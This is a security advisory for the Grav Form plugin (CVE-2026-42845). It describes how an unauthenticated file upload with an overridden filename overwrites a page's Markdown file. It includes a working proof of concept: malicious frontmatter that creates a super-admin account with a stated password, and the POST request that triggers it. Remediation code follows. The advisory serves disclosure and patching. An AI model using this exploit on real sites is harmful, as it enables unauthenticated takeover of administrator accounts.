# [H] Grav Form Plugin has an Anonymous Page Content Overwrite via Form File Upload filename Override

## Summary
Severity: High
Advisory: GHSA-w4rc-p66m-x6qq
CVE: CVE-2026-42845
CWE: CWE-20, CWE-73
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-w4rc-p66m-x6qq
Type: github-advisory

## Affected
- Packagist: `getgrav/grav-plugin-form` — affected >=0 <9.1.0

## Details
### Summary
(Tested on Form 9.0.3 released on April, 28th)

The Form plugin's file upload handler at `user/plugins/form/classes/Form.php:583` accepts a POST-supplied `filename` parameter (`$filename = $post['filename'] ?? $upload['file']['name']`) that overrides the original uploaded filename. The override passes through `Utils::checkFilename()`, which blocks only a narrow extension list (`.php*`, `.htm*`, `.js`, `.exe`). Markdown (`.md`) is **not** blocked.

A page's directory under `user/pages/` contains its `.md` content file (e.g. `default.md`, `form.md`). When a form's file upload field has `accept: ['*']` (or any policy that admits text files), an unauthenticated visitor can:

1. Upload **arbitrary content** with **`filename=form.md`** (or other page-content filenames),
2. Submit the form to trigger `Form::copyFiles()`, which **overwrites the page's own `.md` file**.

### Details
**Vulnerable code path**

`user/plugins/form/classes/Form.php:580-606` (in `uploadFiles()`):
```php
$grav->fireEvent('onFormUploadSettings', new Event(['settings' => &$settings, 'post' => $post]));

$upload = json_decode(json_encode($this->normalizeFiles($_FILES['data'], $settings->name)), true);
$filename = $post['filename'] ?? $upload['file']['name'];           // ← POST-controlled
// ...
if (!Utils::checkFilename($filename)) {                              // ← extension blocklist only
    return ['status' => 'error', 'message' => 'Bad filename'];
}
```

`Utils::checkFilename()` (`system/src/Grav/Common/Utils.php:980`) blocks `..`, slashes, null bytes, leading/trailing dots, and the `uploads_dangerous_extensions` list. The default list contains: `php, php2-5, phar, phtml, html, htm, shtml, shtm, js, exe`. **`md` is not on the list**.

The MIME check (lines 627-654) uses `Utils::getMimeByFilename($filename)` against the blueprint's `accept` list. With `accept: ['*']`, all filenames pass.

After upload, the file is held in flash storage. When the form is submitted, `Form::copyFiles()` (`user/plugins/form/classes/Form.php:1041-1074`) calls `$upload->moveTo($destination)`:
```php
$destination = $upload->getDestination();   // ← determined at upload time:
                                            //   $destination = $page_dir . '/' . $filename
$folder = $filesystem->dirname($destination);
if (!is_dir($folder) && !@mkdir($folder, 0777, true) && !is_dir($folder)) { ... }
$upload->moveTo($destination);
```

`moveTo()` does not check whether `$destination` is an existing protected file — if `form.md` (the page's own content) already exists at the destination, it is **overwritten**.

A Grav page's `.md` file is parsed as YAML frontmatter + Markdown content. Whatever content the attacker uploaded becomes the new page definition.

### PoC

**Setup** :

Any existing page with a form like this — a "generic upload" form is the realistic case:
```yaml
---
title: Upload your file
form:
    name: upform
    fields:
        - {name: img, type: file, multiple: false, accept: ['*'], destination: 'self@'}
        - {name: notes, type: text}
    buttons:
        - {type: submit, value: Upload}
    process:
        - upload: true
        - display: thanks
---
```
1. Atacker uploads a malicious md file that replaces the form's md file. Lets say the form is under the path `/upload`.

```yaml
---
title: Pwned
form:
    name: pwn
    fields:
        - {name: dummy, type: text}
    buttons:
        - {type: submit, value: Submit}
    process:
        - save:
            folder: '../accounts'
            filename: 'viaup.yaml'
            extension: yaml
            operation: create
            body: |
                state: enabled
                email: viaup@example.com
                fullname: Via Upload
                title: Admin
                access:
                  admin: { login: true, super: true }
                  site:  { login: true }
                hashed_password: $2y$10$zGRm19Dk5ivMFZS5taMtU.O8WDUZpTqSsSg8JFs4SwOxJ/N6wl/Uq
        - display: thanks
---
```
(Hash above is bcrypt for `PwnPass123!`.)

2. Attacker accesses the new markdown file under the original path  and loads the new markdown file `GET /upload`.
3. Attacker sends a form POST request to `/upload` and change the form_name to whatever the payload form name is.
 Keep in mind the nonce has to be valid.

```
POST /upload HTTP/1.1

------geckoformboundary44d7ad8deb57480098493877a35ad715
Content-Disposition: form-data; name="data[_json][img]"

[]
------geckoformboundary44d7ad8deb57480098493877a35ad715
Content-Disposition: form-data; name="data[notes]"


------geckoformboundary44d7ad8deb57480098493877a35ad715
Content-Disposition: form-data; name="__form-name__"

pwn
------geckoformboundary44d7ad8deb57480098493877a35ad715
Content-Disposition: form-data; name="__unique_form_id__"

8r7q1iwdnnmcgkohlbtj
------geckoformboundary44d7ad8deb57480098493877a35ad715
Content-Disposition: form-data; name="form-nonce"

4e9417f0c7e89d1ab4e0dbe136ec78bd
------geckoformboundary44d7ad8deb57480098493877a35ad715--
```

4. Login as a newly created super admin user.

### Impact

Grav pages that allows user to uploads any file (besides the ones in the blocklist) with the default `self@` configuration  is able to upload a malicious markdown file to overwrite the existing markdown file. In this case, unauthenticated users were able to escalate their privileges to super-admin. 

### Remediation

Block sensitive page-content filenames at upload

In `user/plugins/form/classes/Form.php`, after `Utils::checkFilename()` succeeds, add a content-area-aware check:

```php
// Block files that would overwrite Grav page content if uploaded into
// a page directory. Page templates are .md (Markdown) and .yaml/.yml
// (frontmatter overrides). Block both for safety.
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
$pageContentExtensions = ['md', 'yaml', 'yml', 'json', 'twig'];
if (in_array($ext, $pageContentExtensions, true)) {
    return [
        'status'  => 'error',
        'message' => 'File type not allowed for upload (page content files are blocked)',
    ];
}
```

Add `md, yaml, yml, json, twig, ini` to the global `security.uploads_dangerous_extensions` list — these all carry executable semantics in Grav's runtime even though they are not "PHP".

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-w4rc-p66m-x6qq
- https://nvd.nist.gov/vuln/detail/CVE-2026-42845
- https://github.com/getgrav/grav-plugin-form/commit/48bacc4187e1cff815000e526d5ca2878484867f
- https://github.com/getgrav/grav
